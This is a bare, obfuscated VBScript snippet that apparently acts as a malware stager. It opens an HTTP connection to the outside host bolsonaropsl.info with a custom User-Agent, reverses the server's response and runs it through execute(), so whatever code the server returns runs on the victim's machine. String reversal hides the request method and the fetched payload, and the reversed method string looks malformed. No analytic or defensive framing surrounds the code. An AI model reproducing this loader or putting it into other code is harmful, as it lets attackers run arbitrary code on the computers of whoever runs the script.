set hI2F1=CreateObject("Msxml2.xmlhttp")
mWGol="Eet2FcjQJH4Hdl16WKD4Ujlxn"
hI2F1.open StrReverse("enviar") , "http://bolsonaropsl.info/?join=x5&" & mWGol ,false
execute("hI2F1.setRequestHeader ""User-Agent"", ""MyCustomUser"":hI2F1.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":hI2F1.send ""join=open"":B=StrReverse(hI2F1.responseText):execute(B)")
